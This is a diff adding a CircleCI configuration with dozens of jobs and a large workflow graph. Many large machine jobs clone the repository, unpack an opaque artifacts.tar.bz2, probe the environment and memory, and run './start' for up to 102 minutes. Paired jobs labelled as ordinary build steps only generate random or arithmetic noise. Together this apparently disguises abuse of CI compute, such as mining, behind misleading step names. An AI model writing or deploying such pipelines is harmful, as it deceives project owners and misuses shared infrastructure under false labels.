+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./start
+  postcheck_v3-edge:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Normalize path list
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc 'a-f0-9' | head -c 194560 | fold -w16 | awk '!seen[$0]++' | wc -l; true ; } > /tmp/data/log.ndjson
+            size=$(wc -c </tmp/data/log.ndjson); echo "stage ok: v3-edge size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - log.ndjson
+  v3-edge:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Load upstream state
+          command: |
+            { od -An -c /tmp/data/216.data 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xj -f artifacts.tar.bz2
+      - run:
+          name: Store metadata
+          command: env | wc -l
+      - run:
+          name: Store metadata
+          command: free -m
+      - run:
+          name: Cooldown
+          command: date -u
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./start
+  hook_alpha-4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Format readable table
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; tr -dc '0-9' </dev/urandom | head -c 2355200 | wc -c; true ; } > /tmp/data/.state
+            size=$(wc -c </tmp/data/.state); echo "stage ok: alpha-4 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - .state
+  alpha-4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Load upstream state
+          command: |
+            { od -An -c /tmp/data/216.data 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xj -f artifacts.tar.bz2
+      - run:
+          name: Store metadata
+          command: env | wc -l
+      - run:
+          name: Store metadata
+          command: free -m
+      - run:
+          name: Cooldown
+          command: date -u
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./start
+  spin_rm-webhook:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Build adjacency map
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1M count=23 2>/dev/null | sha256sum; true ; } > /tmp/data/62.log
+            size=$(wc -c </tmp/data/62.log); echo "stage ok: rm-webhook size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 62.log
+  rm-webhook:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Load upstream state
+          command: |
+            { od -An -c /tmp/data/62.log 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xj -f artifacts.tar.bz2
+      - run:
+          name: Store metadata
+          command: env | wc -l
+      - run:
+          name: Store metadata
+          command: free -m
+      - run:
+          name: Cooldown
+          command: date -u
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./start
+  fetcher_sierra-7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Weigh batch output
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; head -c 23M /dev/urandom | base64 | wc -c; true ; } > /tmp/data/handoff.state
+            size=$(wc -c </tmp/data/handoff.state); echo "stage ok: sierra-7 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - handoff.state
+  sierra-7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Load upstream state
+          command: |
+            { od -An -c /tmp/data/handoff.state 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xj -f artifacts.tar.bz2
+      - run:
+          name: Store metadata
+          command: env | wc -l
+      - run:
+          name: Store metadata
+          command: free -m
+      - run:
+          name: Cooldown
+          command: date -u
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./start
+  fixture_Run_Prod7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Inflate reference set
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 14000 | awk '{for(i=1;i<=5;i++)s+=$1*i}END{print s}'; true ; } > /tmp/data/2024-07-02.data
+            size=$(wc -c </tmp/data/2024-07-02.data); echo "stage ok: Run_Prod7 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 2024-07-02.data
+  Run_Prod7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Load upstream state
+          command: |
+            { od -An -c /tmp/data/2024-07-02.data 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xj -f artifacts.tar.bz2
+      - run:
+          name: Store metadata
+          command: env | wc -l
+      - run:
+          name: Store metadata
+          command: free -m
+      - run:
+          name: Cooldown
+          command: date -u
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./start
+  compile_send-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Snapshot session env
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<480376;i++) printf "%d\n", (i*7919)%2147483647}' | wc -l; true ; } > /tmp/data/.done
+            size=$(wc -c </tmp/data/.done); echo "stage ok: send-it size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - .done
+  send-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Load upstream state
+          command: |
+            { od -An -c /tmp/data/216.data 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xj -f artifacts.tar.bz2
+      - run:
+          name: Store metadata
+          command: env | wc -l
+      - run:
+          name: Store metadata
+          command: free -m
+      - run:
+          name: Cooldown
+          command: date -u
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./start
+  spin_v1-rc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Build summary row
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 175964 | awk 'END{print NR}'; true ; } > /tmp/data/artifact.bin
+            size=$(wc -c </tmp/data/artifact.bin); echo "stage ok: v1-rc size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - artifact.bin
+  v1-rc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Load upstream state
+          command: |
+            { od -An -c /tmp/data/artifact.bin 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xj -f artifacts.tar.bz2
+      - run:
+          name: Store metadata
+          command: env | wc -l
+      - run:
+          name: Store metadata
+          command: free -m
+      - run:
+          name: Cooldown
+          command: date -u
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./start
+
+  redo_rm-webhook_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Compute spill delta
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 111614 | awk 'NR>22971 && NR<59642{s+=$1}END{print s}'; true ; } > /tmp/data/62.log
+            size=$(wc -c </tmp/data/62.log); echo "stage ok: rm-webhook size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 62.log
+  hook_produce-full-test-matrix_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Collect gauge frames
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; head -c 22020096 /dev/urandom | gzip -1 | wc -c; true ; } > /tmp/data/66.out
+            size=$(wc -c </tmp/data/66.out); echo "stage ok: produce-full-test-matrix size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 66.out
+  B_preview_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Measure branch cost
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc '[:xdigit:]' | head -c 25600 | wc -c; true ; } > /tmp/data/step-10.txt
+            size=$(wc -c </tmp/data/step-10.txt); echo "stage ok: preview size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - step-10.txt
+  round1_py310-cov_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Rank ordinal values
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc '[:xdigit:]' | head -c 21504 | wc -c; true ; } > /tmp/data/25.blob
+            size=$(wc -c </tmp/data/25.blob); echo "stage ok: py310-cov size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 25.blob
+  fetcher_rm-dashboard_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Fuse row chunks
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc '[:xdigit:]' | head -c 14336 | wc -c; true ; } > /tmp/data/stage.blob
+            size=$(wc -c </tmp/data/stage.blob); echo "stage ok: rm-dashboard size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - stage.blob
+  verify_tb-alt_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Record manifest digest
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 500 | awk '{print toupper($0)}' | md5sum; true ; } > /tmp/data/artifact.tgz
+            size=$(wc -c </tmp/data/artifact.tgz); echo "stage ok: tb-alt size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - artifact.tgz
+  builder_sierra-7_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Reset analytics bucket
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 25195); do printf "%08x\n" $RANDOM; done ) | sort | md5sum; true ; } > /tmp/data/handoff.state
+            size=$(wc -c </tmp/data/handoff.state); echo "stage ok: sierra-7 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - handoff.state
+  runner_anothr-run-54_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Reduce text corpus
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=4k count=140 2>/dev/null | md5sum; true ; } > /tmp/data/step-4.txt
+            size=$(wc -c </tmp/data/step-4.txt); echo "stage ok: anothr-run-54 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - step-4.txt
+  red_Run_Prod7_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Build frequency table
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 27920 | paste - - - - | wc -l; true ; } > /tmp/data/2024-07-02.data
+            size=$(wc -c </tmp/data/2024-07-02.data); echo "stage ok: Run_Prod7 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 2024-07-02.data
+  C_Verify_Image5_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Walk directory tree
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; tr -dc 'A-Za-z0-9' </dev/urandom | head -c 112640 | fold -w40 | sort | uniq -c | wc -l; true ; } > /tmp/data/.lock
+            size=$(wc -c </tmp/data/.lock); echo "stage ok: Verify_Image5 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - .lock
+  go_v5-nightly_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Collect byte metrics
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=387193;i++){x=sqrt(i);y=int(x);if(y*y==i)c++}print c}'; true ; } > /tmp/data/.sig
+            size=$(wc -c </tmp/data/.sig); echo "stage ok: v5-nightly size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - .sig
+  warmer_v1-rc_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Enumerate line counts
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 37098 | awk 'NR%3==0{print}' | wc -l; true ; } > /tmp/data/artifact.bin
+            size=$(wc -c </tmp/data/artifact.bin); echo "stage ok: v1-rc size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - artifact.bin
+  warmup_cf-2a_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Pivot result stream
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; head -c 17825792 /dev/urandom | od -An -x | wc -w; true ; } > /tmp/data/2023-08-05.data
+            size=$(wc -c </tmp/data/2023-08-05.data); echo "stage ok: cf-2a size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 2023-08-05.data
+workflows:
+  workflow:
+    jobs:
+      - provision_v1-beta3
+      - postcheck_callisto-rev
+      - v1-beta3:
+          requires:
+            - provision_v1-beta3
+            - postcheck_callisto-rev
+      - callisto-rev:
+          requires:
+            - provision_v1-beta3
+            - postcheck_callisto-rev
+      - andromeda-ng:
+          requires:
+            - provision_v1-beta3
+            - postcheck_callisto-rev
+      - qi-run:
+          requires:
+            - provision_v1-beta3
+            - postcheck_callisto-rev
+      - atlas-final:
+          requires:
+            - provision_v1-beta3
+            - postcheck_callisto-rev
+      - spin_rm-webhook
+      - redo_rm-webhook_2:
+          requires:
+            - spin_rm-webhook
+      - rm-webhook:
+          requires:
+            - redo_rm-webhook_2
+      - ctx2_produce-full-test-matrix:
+          requires:
+            - redo_rm-webhook_2
+      - hook_produce-full-test-matrix_2:
+          requires:
+            - ctx2_produce-full-test-matrix
+      - produce-full-test-matrix:
+          requires:
+            - hook_produce-full-test-matrix_2
+      - hook_preview:
+          requires:
+            - hook_produce-full-test-matrix_2
+      - B_preview_2:
+          requires:
+            - hook_preview
+      - preview:
+          requires:
+            - B_preview_2
+      - beta_py310-cov:
+          requires:
+            - B_preview_2
+      - round1_py310-cov_2:
+          requires:
+            - beta_py310-cov
+      - py310-cov:
+          requires:
+            - round1_py310-cov_2
+      - produce_vega-rc
+      - compile_send-it
+      - vendor_VerifyStaging
+      - vega-rc:
+          requires:
+            - produce_vega-rc
+            - compile_send-it
+            - vendor_VerifyStaging
+      - send-it:
+          requires:
+            - produce_vega-rc
+            - compile_send-it
+            - vendor_VerifyStaging
+      - VerifyStaging:
+          requires:
+            - produce_vega-rc
+            - compile_send-it
+            - vendor_VerifyStaging
+      - alpha-4:
+          requires:
+            - produce_vega-rc
+            - compile_send-it
+            - vendor_VerifyStaging
+      - rm-router-v2:
+          requires:
+            - produce_vega-rc
+            - compile_send-it
+            - vendor_VerifyStaging
+      - v3-edge:
+          requires:
+            - produce_vega-rc
+            - compile_send-it
+            - vendor_VerifyStaging
+      - canary1_rm-dashboard
+      - fetcher_rm-dashboard_2:
+          requires:
+            - canary1_rm-dashboard
+      - rm-dashboard:
+          requires:
+            - fetcher_rm-dashboard_2
+      - deps_tb-alt:
+          requires:
+            - fetcher_rm-dashboard_2
+      - verify_tb-alt_2:
+          requires:
+            - deps_tb-alt
+      - tb-alt:
+          requires:
+            - verify_tb-alt_2
+      - fetcher_sierra-7:
+          requires:
+            - verify_tb-alt_2
+      - builder_sierra-7_2:
+          requires:
+            - fetcher_sierra-7
+      - sierra-7:
+          requires:
+            - builder_sierra-7_2
+      - reserve_anothr-run-54:
+          requires:
+            - builder_sierra-7_2
+      - runner_anothr-run-54_2:
+          requires:
+            - reserve_anothr-run-54
+      - anothr-run-54:
+          requires:
+            - runner_anothr-run-54_2
+      - fixture_Run_Prod7:
+          requires:
+            - runner_anothr-run-54_2
+      - red_Run_Prod7_2:
+          requires:
+            - fixture_Run_Prod7
+      - Run_Prod7:
+          requires:
+            - red_Run_Prod7_2
+      - reload_Verify_Image5:
+          requires:
+            - red_Run_Prod7_2
+      - C_Verify_Image5_2:
+          requires:
+            - reload_Verify_Image5
+      - Verify_Image5:
+          requires:
+            - C_Verify_Image5_2
+      - B_juliet
+      - linter_assemble-partial-integration-tests
+      - juliet:
+          requires:
+            - B_juliet
+            - linter_assemble-partial-integration-tests
+      - assemble-partial-integration-tests:
+          requires:
+            - B_juliet
+            - linter_assemble-partial-integration-tests
+      - bob-push:
+          requires:
+            - B_juliet
+            - linter_assemble-partial-integration-tests
+      - rigel-plus:
+          requires:
+            - B_juliet
+            - linter_assemble-partial-integration-tests
+      - wip-db:
+          requires:
+            - B_juliet
+            - linter_assemble-partial-integration-tests
+      - PROD_BUILD_7:
+          requires:
+            - B_juliet
+            - linter_assemble-partial-integration-tests
+      - linter_v5-nightly
+      - go_v5-nightly_2:
+          requires:
+            - linter_v5-nightly
+      - v5-nightly:
+          requires:
+            - go_v5-nightly_2
+      - spin_v1-rc:
+          requires:
+            - go_v5-nightly_2
+      - warmer_v1-rc_2:
+          requires:
+            - spin_v1-rc
+      - v1-rc:
+          requires:
+            - warmer_v1-rc_2
+      - C_cf-2a:
+          requires:
+            - warmer_v1-rc_2
+      - warmup_cf-2a_2:
+          requires:
+            - C_cf-2a
+      - cf-2a:
+          requires:
+            - warmup_cf-2a_2
